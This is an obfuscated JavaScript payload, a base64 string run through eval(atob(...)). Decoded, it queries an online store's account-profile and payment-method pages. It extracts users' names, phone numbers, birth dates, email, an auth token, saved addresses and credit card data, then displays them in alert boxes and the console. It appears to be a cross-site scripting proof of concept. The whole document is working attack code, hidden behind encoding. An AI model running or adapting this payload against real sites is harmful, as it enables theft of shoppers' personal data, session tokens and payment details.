eval(atob('Y29uc3QgeGhyMDEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKY29uc3QgeGhyMDIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKCnhocjAxLm9ubG9hZCA9IGZ1bmN0aW9uKCkgewogICAgaWYgKHRoaXMuc3RhdHVzID09PSAyMDApIHsgLy8gQ2hlY2sgaWYgdGhlIHJlcXVlc3Qgd2FzIHN1Y2Nlc3NmdWwKICAgICAgICBjb25zdCBwYXJzZXIgPSBuZXcgRE9NUGFyc2VyKCk7CiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBwYXJzZXIucGFyc2VGcm9tU3RyaW5nKHRoaXMucmVzcG9uc2VUZXh0LCAndGV4dC9odG1sJyk7CiAgICAgICAgY29uc3QgZGF0YTAxID0gW107CiAgICAgICAgZGF0YTAxLnB1c2goZG9jdW1lbnQuZG9tYWluKTsKICAgICAgICBjb25zdCBmaWVsZHMgPSBbCiAgICAgICAgICAgICJwZXJzb25UaXRsZU9sZCIsCiAgICAgICAgICAgICJmaXJzdE5hbWVPbGQiLAogICAgICAgICAgICAibGFzdE5hbWVPbGQiLAogICAgICAgICAgICAiZ2VuZGVyT2xkIiwKICAgICAgICAgICAgInBob25lTnVtYmVyT2xkIiwKICAgICAgICAgICAgImRhdGVPZkJpcnRoRERPbGQiLAogICAgICAgICAgICAiZGF0ZU9mQmlydGhNTU9sZCIsCiAgICAgICAgICAgICJkYXRlT2ZCaXJ0aFlZT2xkIiwKICAgICAgICAgICAgImVtYWlsRmllbGRWYWx1ZSIsCiAgICAgICAgICAgICJhdXRoVG9rZW4iCiAgICAgICAgXTsKICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGZpZWxkcy5sZW5ndGg7IGkrKykgeyAKICAgICAgICAgICAgY29uc3QgdG1wID0gcmVzcG9uc2UuZ2V0RWxlbWVudHNCeU5hbWUoZmllbGRzW2ldKTsKICAgICAgICAgICAgaWYgKHRtcC5sZW5ndGggPiAwICYmIHRtcFswXS52YWx1ZS5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICBkYXRhMDEucHVzaChmaWVsZHNbaV0gKyAiIDogIiArIHRtcFswXS52YWx1ZSk7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhmaWVsZHNbaV0gKyAiIDogIiArIHRtcFswXS52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgYWxlcnQoZGF0YTAxLmpvaW4oJ1xuJykpOwogICAgfQp9OwoKeGhyMDIub25sb2FkID0gZnVuY3Rpb24oKSB7CiAgICBpZiAodGhpcy5zdGF0dXMgPT09IDIwMCkgeyAvLyBDaGVjayBpZiB0aGUgcmVxdWVzdCB3YXMgc3VjY2Vzc2Z1bAogICAgICAgIGNvbnN0IHBhcnNlciA9IG5ldyBET01QYXJzZXIoKTsKICAgICAgICBjb25zdCByZXNwb25zZSA9IHBhcnNlci5wYXJzZUZyb21TdHJpbmcodGhpcy5yZXNwb25zZVRleHQsICd0ZXh0L2h0bWwnKTsKICAgICAgICBjb25zdCBzY3JpcHRzID0gcmVzcG9uc2UuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpOwogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2NyaXB0cy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICBpZiAoc2NyaXB0c1tpXS5pbm5lclRleHQuaW5jbHVkZXMoJ2RhdGFQYXlsb2FkID0nKSkgewogICAgICAgICAgICAgICAgLy8gQ3JlYXRpbmcgYSBzYWZlIGZ1bmN0aW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdCB3aXRob3V0IGV2YWwKICAgICAgICAgICAgICAgIGNvbnN0IHNjcmlwdENvbnRlbnQgPSBzY3JpcHRzW2ldLmlubmVyVGV4dC5yZXBsYWNlKCJ2YXIgZGF0YVBheWxvYWQgPSIsICJ3aW5kb3cuZGF0YVBheWxvYWQgPSIpOwogICAgICAgICAgICAgICAgY29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgICAgICAgICBzY3JpcHQudGV4dENvbnRlbnQgPSBzY3JpcHRDb250ZW50OwogICAgICAgICAgICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoc2NyaXB0KTsKCiAgICAgICAgICAgICAgICBpZiAod2luZG93LmRhdGFQYXlsb2FkKSB7CiAgICAgICAgICAgICAgICAgICAgYWxlcnQoSlNPTi5zdHJpbmdpZnkod2luZG93LmRhdGFQYXlsb2FkLmFkZHJlc3NlcykpOwogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKEpTT04uc3RyaW5naWZ5KHdpbmRvdy5kYXRhUGF5bG9hZC5hZGRyZXNzZXMpKTsKICAgICAgICAgICAgICAgICAgICBhbGVydChKU09OLnN0cmluZ2lmeSh3aW5kb3cuZGF0YVBheWxvYWQuY3JlZGl0Q2FyZHMpKTsKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhKU09OLnN0cmluZ2lmeSh3aW5kb3cuZGF0YVBheWxvYWQuY3JlZGl0Q2FyZHMpKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9OwoKeGhyMDEub3BlbigiR0VUIiwgIi9NU0FjY291bnRQcm9maWxlRGlzcGxheVZpZXc/Y2F0YWxvZ0lkPTEwMDUxJmxhbmdJZD0tMjQmc3RvcmVJZD0xMDE1MSIsIGZhbHNlKTsKeGhyMDEuc2VuZCgpOwoKeGhyMDIub3BlbigiR0VUIiwgIi9NU1VzZXJQcm9maWxlUGF5bWVudE1ldGhvZERpc3BsYXlWaWV3P2NhdGFsb2dJZD0xMDA1MSZsYW5nSWQ9LTI0JnN0b3JlSWQ9MTAxNTEiLCBmYWxzZSk7CnhocjAyLnNlbmQoKTs='));
